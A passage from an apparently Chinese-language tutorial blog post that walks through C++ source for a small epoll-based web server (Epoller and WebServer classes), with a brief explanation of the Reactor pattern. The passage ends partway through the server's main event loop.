</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Epoller</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Epoller</span><span class="params">(<span class="type">int</span> MaxEvent = <span class="number">1024</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Epoller</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">AddFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">uint32_t</span> events)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">ModFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">uint32_t</span> events)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">DelFd</span><span class="params">(<span class="type">int</span> fd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Wait</span><span class="params">(<span class="type">int</span> timeoutMs = <span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetEventFd</span><span class="params">(<span class="type">size_t</span> i)</span>    <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">uint32_t</span> <span class="title">GetEvents</span><span class="params">(<span class="type">size_t</span> i)</span>    <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> epollFd_;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> epoll_event&gt; events_;    </span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="epoller-cpp"><a href="#epoller-cpp" class="headerlink" title="epoller.cpp"></a>epoller.cpp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;epoller.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Epoller::<span class="built_in">Epoller</span>(<span class="type">int</span> MaxEvent )</span><br><span class="line">:<span class="built_in">epollFd_</span>(<span class="built_in">epoll_create</span>(MaxEvent)), <span class="built_in">events_</span>(MaxEvent)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="built_in">assert</span>(epollFd_ &gt;= <span class="number">0</span> &amp;&amp; events_.<span class="built_in">size</span>() &gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Epoller::~<span class="built_in">Epoller</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">close</span>(epollFd_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Epoller::AddFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">uint32_t</span> events)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    epoll_event ev = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ev.events = events;</span><br><span class="line">    ev.data.fd = fd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> == <span class="built_in">epoll_ctl</span>(epollFd_,EPOLL_CTL_ADD,fd,&amp;ev);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Epoller::ModFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">uint32_t</span> events)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     epoll_event ev = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ev.events = events;</span><br><span class="line">    ev.data.fd = fd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> == <span class="built_in">epoll_ctl</span>(epollFd_,EPOLL_CTL_MOD,fd,&amp;ev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Epoller::DelFd</span><span class="params">(<span class="type">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    epoll_event ev = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">//ev.data.fd = fd;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> == <span class="built_in">epoll_ctl</span>(epollFd_,EPOLL_CTL_DEL,fd,&amp;ev);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Epoller::Wait</span><span class="params">(<span class="type">int</span> timeoutMs )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">epoll_wait</span>(epollFd_, &amp;events_[<span class="number">0</span>], <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(events_.<span class="built_in">size</span>()), timeoutMs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Epoller::GetEventFd</span><span class="params">(<span class="type">size_t</span> i)</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(i &lt; events_.<span class="built_in">size</span>() &amp;&amp; i &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> events_[i].data.fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">Epoller::GetEvents</span><span class="params">(<span class="type">size_t</span> i)</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(i &lt; events_.<span class="built_in">size</span>() &amp;&amp; i &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> events_[i].events;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="webserver"><a href="#webserver" class="headerlink" title="webserver"></a>webserver</h3><p>到达<code>webserver</code>最高层<code>webserver</code>！这里我们主要是将将各个类结合起来。</p><p><a href="https://blog.csdn.net/JMW1407/article/details/107321853">socket 网络编程——端口复用技术（setsockopt（））（linux下多个进程监听同一个端口）_linux setsockopt-CSDN博客</a></p><p><strong>Reactor模式与Proactor模式:</strong></p><p><a href="https://blog.csdn.net/ZYZMZM_/article/details/98049471">两种高效的事件处理模式：Reactor模式和Proactor模式_proactor模式和reactor模式应用场景-CSDN博客</a></p><p>需要处理大量并发连接的网络服务器中，Reactor模式可能是更好的选择，因为它可以更有效地利用系统资源。而在需要处理大量I/O操作的应用中，Proactor模式可能更适合，因为它可以简化I/O操作的处理。</p><p>由于我们搭建的是tinywebserver，因此这里我们使用的是<code>Reactor</code>模式。</p><p>//TODO</p><h4 id="webserver-h"><a href="#webserver-h" class="headerlink" title="webserver.h"></a>webserver.h</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WEBSERVER_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSERVER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span> <span class="comment">//ip转换</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>      <span class="comment">//文件控制</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span> <span class="comment">//互联网协议家族的定义</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span> <span class="comment">//socket</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     <span class="comment">//POSIX操作系统API的访问</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;epoller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../log/log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../timer/heaptimer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../pool/sqlconnpool.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../pool/threadpool.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../pool/sqlconnRAII.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../http/httpconn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebServer</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">WebServer</span>(</span><br><span class="line">        <span class="type">int</span> port, <span class="type">int</span> trigMode, <span class="type">int</span> timeoutMS, <span class="type">bool</span> OptLinger,</span><br><span class="line">        <span class="type">int</span> sqlPort, <span class="type">const</span> <span class="type">char</span>* sqlUser, <span class="type">const</span> <span class="type">char</span>* sqlPwd,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* dbName, <span class="type">int</span> connPoolNum, <span class="type">int</span> threadNum,</span><br><span class="line">        <span class="type">bool</span> openlog, <span class="type">int</span> loglevel, <span class="type">int</span> logQueSize);</span><br><span class="line">    </span><br><span class="line">    ~<span class="built_in">WebServer</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Start</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">InitSocket_</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">InitEventMode_</span><span class="params">(<span class="type">int</span> trigMode)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AddClient_</span><span class="params">(<span class="type">int</span> fd, sockaddr_in addr)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DealListen_</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DealWrite_</span><span class="params">(HttpConn* client)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DealRead_</span><span class="params">(HttpConn* client)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">SendError_</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span>* info)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ExtentTime_</span><span class="params">(HttpConn* Client)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">CloseConn_</span><span class="params">(HttpConn* client)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">OnRead_</span><span class="params">(HttpConn* client)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">OnWrite_</span><span class="params">(HttpConn* client)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">OnProcess</span><span class="params">(HttpConn* client)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> MAX_FD = <span class="number">65536</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">SetFdNonblock</span><span class="params">(<span class="type">int</span> fd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> port_;</span><br><span class="line">    <span class="type">bool</span> openLinger_;</span><br><span class="line">    <span class="type">int</span> timeoutMS_;</span><br><span class="line">    <span class="type">bool</span> isClose_;</span><br><span class="line">    <span class="type">int</span> listenFd_;</span><br><span class="line">    <span class="type">char</span>* srcDir_;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> listenEvent_;</span><br><span class="line">    <span class="type">uint32_t</span> connEvent_;</span><br><span class="line"></span><br><span class="line">    std::unique_ptr&lt;HeapTimer&gt; timer_;</span><br><span class="line">    std::unique_ptr&lt;ThreadPool&gt; threadpool_;</span><br><span class="line">    std::unique_ptr&lt;Epoller&gt; epoller_;</span><br><span class="line">    std::unordered_map&lt;<span class="type">int</span>, HttpConn&gt; users_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h4 id="webserver-cpp"><a href="#webserver-cpp" class="headerlink" title="webserver.cpp"></a>webserver.cpp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;webserver.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WebServer::<span class="built_in">WebServer</span>(</span><br><span class="line">            <span class="type">int</span> port, <span class="type">int</span> trigMode, <span class="type">int</span> timeoutMS, <span class="type">bool</span> OptLinger,</span><br><span class="line">            <span class="type">int</span> sqlPort, <span class="type">const</span> <span class="type">char</span>* sqlUser, <span class="type">const</span>  <span class="type">char</span>* sqlPwd,</span><br><span class="line">            <span class="type">const</span> <span class="type">char</span>* dbName, <span class="type">int</span> connPoolNum, <span class="type">int</span> threadNum,</span><br><span class="line">            <span class="type">bool</span> openLog, <span class="type">int</span> logLevel, <span class="type">int</span> logQueSize)</span><br><span class="line">            :<span class="built_in">port_</span>(port), <span class="built_in">openLinger_</span>(OptLinger), <span class="built_in">timeoutMS_</span>(timeoutMS), <span class="built_in">isClose_</span>(<span class="literal">false</span>),</span><br><span class="line">            <span class="built_in">timer_</span>(<span class="keyword">new</span> <span class="built_in">HeapTimer</span>()), <span class="built_in">threadpool_</span>(<span class="keyword">new</span> <span class="built_in">ThreadPool</span>(threadNum)), <span class="built_in">epoller_</span>(<span class="keyword">new</span> <span class="built_in">Epoller</span>())</span><br><span class="line">&#123;</span><br><span class="line">  srcDir_ = <span class="built_in">getcwd</span>(<span class="literal">nullptr</span>, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">assert</span>(srcDir_);</span><br><span class="line">  <span class="built_in">strncat</span>(srcDir_, <span class="string">&quot;/resources/&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  HttpConn::userCount = <span class="number">0</span>;</span><br><span class="line">  HttpConn::srcDir = srcDir_;</span><br><span class="line"></span><br><span class="line"> SqlConnPool::<span class="built_in">Instance</span>()-&gt;<span class="built_in">Init</span>(<span class="string">&quot;localhost&quot;</span>, sqlPort, sqlUser, sqlPwd, dbName, connPoolNum);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">InitEventMode_</span>(trigMode);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">InitSocket_</span>()) &#123;</span><br><span class="line">    isClose_ = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (openLog) &#123;</span><br><span class="line">    Log::<span class="built_in">Instance</span>()-&gt;<span class="built_in">init</span>(logLevel, <span class="string">&quot;./log&quot;</span>, <span class="string">&quot;.log&quot;</span>, logQueSize);</span><br><span class="line">    <span class="keyword">if</span> (isClose_) &#123;</span><br><span class="line">      <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;========== Server init error!==========&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">LOG_INFO</span>(<span class="string">&quot;========== Server init ==========&quot;</span>);</span><br><span class="line">      <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Port:%d, OpenLinger: %s&quot;</span>, port_, OptLinger ? <span class="string">&quot;true&quot;</span> : <span class="string">&quot;false&quot;</span>);</span><br><span class="line">      <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Listen Mode: %s, OpenConn Mode: %s&quot;</span>,</span><br><span class="line">               (listenEvent_ &amp; EPOLLET ? <span class="string">&quot;ET&quot;</span> : <span class="string">&quot;LT&quot;</span>),</span><br><span class="line">               (connEvent_ &amp; EPOLLET ? <span class="string">&quot;ET&quot;</span> : <span class="string">&quot;LT&quot;</span>));</span><br><span class="line">      <span class="built_in">LOG_INFO</span>(<span class="string">&quot;LogSys level: %d&quot;</span>, logLevel);</span><br><span class="line">      <span class="built_in">LOG_INFO</span>(<span class="string">&quot;srcDir: %s&quot;</span>, HttpConn::srcDir);</span><br><span class="line">      <span class="built_in">LOG_INFO</span>(<span class="string">&quot;SqlConnPool num: %d, ThreadPool num: %d&quot;</span>, connPoolNum,</span><br><span class="line">               threadNum);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">WebServer::~<span class="built_in">WebServer</span>() &#123;</span><br><span class="line">  <span class="built_in">close</span>(listenFd_);</span><br><span class="line">  isClose_ = <span class="literal">true</span>;</span><br><span class="line">  <span class="built_in">free</span>(srcDir_);</span><br><span class="line">  SqlConnPool::<span class="built_in">Instance</span>()-&gt;<span class="built_in">ClosePool</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::Start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> timeMS = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (!isClose_) &#123;</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;========== Server start ==========&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (!isClose_) &#123;</span><br><span class="line">    <span class="keyword">if</span> (timeoutMS_ &gt; <span class="number">0</span>)</span><br><span class="line">      timeMS = timer_-&gt;<span class="built_in">GetNextTick</span>();</span><br><span class="line">    <span class="type">int</span> eventCnt = epoller_-&gt;<span class="built_in">Wait</span>(timeMS);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; eventCnt; i++) &#123;</span><br><span class="line">      <span class="type">int</span> fd = epoller_-&gt;<span class="built_in">GetEventFd</span>(i);</span><br><span class="line">      <span class="type">uint32_t</span> events = epoller_-&gt;<span class="built_in">GetEvents</span>(i);</span><br><span class="line">      <span class="keyword">if</span> (fd == listenFd_) &#123;</span><br><span class="line">        <span class="built_in">DealListen_</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; (EPOLLRDHUP | EPOLLHUP | EPOLLERR)) &#123;</span><br><span class="line">        <span class="built_in">assert</span>(users_.<span class="built_in">count</span>(fd) &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">CloseConn_</span>(&amp;users_[fd]);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; EPOLLIN) &#123;</span><br><span class="line">        <span class="built_in">assert</span>(users_.<span class="built_in">count</span>(fd) &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">DealRead_</span>(&amp;users_[fd]);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; EPOLLOUT) &#123;</span><br><span class="line">        <span class="built_in">assert</span>(users_.<span class="built_in">count</span>(fd) &gt; <span class="number">0</span>);</span><br><span class="line">        <span 